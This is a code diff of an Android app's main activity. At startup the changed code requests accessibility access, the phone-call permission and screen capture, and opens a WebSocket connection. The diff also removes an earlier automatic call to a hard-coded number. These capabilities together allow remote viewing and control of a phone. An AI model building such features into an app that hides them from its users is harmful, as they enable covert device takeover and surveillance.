@@ -4,7 +4,7 @@ import android.Manifest
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
-import android.net.Uri
+import android.media.projection.MediaProjectionManager
 import android.os.Bundle
 import android.provider.Settings
 import android.widget.TextView
@@ -13,77 +13,49 @@ import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 
 class MainActivity : AppCompatActivity() {
-    private val PHONE_NUMBER = "+1234567890"
     private val PERMISSION_REQUEST_CODE = 100
+    private val SCREEN_CAPTURE_REQUEST = 101
+    private lateinit var webSocketManager: WebSocketManager
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
+        webSocketManager = WebSocketManager(this)
         
-        findViewById<TextView>(R.id.statusText).text = "Setting up..."
+        findViewById<TextView>(R.id.statusText).text = "Connecting..."
         
-        checkAndRequestPermissions()
+        requestAccessibility()
+        requestPhonePermission()
+        startScreenCapture()
+        webSocketManager.connect()
     }
 
-    private fun checkAndRequestPermissions() {
-        // Check accessibility service
+    private fun requestAccessibility() {
         if (!isAccessibilityServiceEnabled()) {
-            findViewById<TextView>(R.id.statusText).text = "Enable Accessibility Service"
-            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
-            startActivity(intent)
+            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
         }
-        
-        // Check phone permission
+    }
+
+    private fun requestPhonePermission() {
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE)
             != PackageManager.PERMISSION_GRANTED) {
-            ActivityCompat.requestPermissions(
-                this,
-                arrayOf(Manifest.permission.CALL_PHONE),
-                PERMISSION_REQUEST_CODE
-            )
-        } else if (isAccessibilityServiceEnabled()) {
-            makeCall()
+            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CALL_PHONE), PERMISSION_REQUEST_CODE)
         }
     }
 
-    override fun onResume() {
-        super.onResume()
-        if (isAccessibilityServiceEnabled() && 
-            ContextCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
-            makeCall()
-        }
-    }
-
-    override fun onRequestPermissionsResult(
-        requestCode: Int,
-        permissions: Array<out String>,
-        grantResults: IntArray
-    ) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-        if (requestCode == PERMISSION_REQUEST_CODE) {
-            if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                if (isAccessibilityServiceEnabled()) {
-                    makeCall()
-                }
-            } else {
-                findViewById<TextView>(R.id.statusText).text = "Permission denied"
-                finish()
-            }
-        }
+    private fun startScreenCapture() {
+        val mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+        startActivityForResult(mediaProjectionManager.createScreenCaptureIntent(), SCREEN_CAPTURE_REQUEST)
     }
 
     private fun isAccessibilityServiceEnabled(): Boolean {
         val service = "$packageName/${QuickAccessibilityService::class.java.canonicalName}"
-        val enabledServices = Settings.Secure.getString(
-            contentResolver,
-            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
-        ) ?: return false
+        val enabledServices = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: return false
         return enabledServices.contains(service)
     }
 
-    private fun makeCall() {
-        val intent = Intent(Intent.ACTION_CALL, Uri.parse("tel:$PHONE_NUMBER"))
-        startActivity(intent)
-        finish()
+    override fun onDestroy() {
+        webSocketManager.disconnect()
+        super.onDestroy()
     }
 }
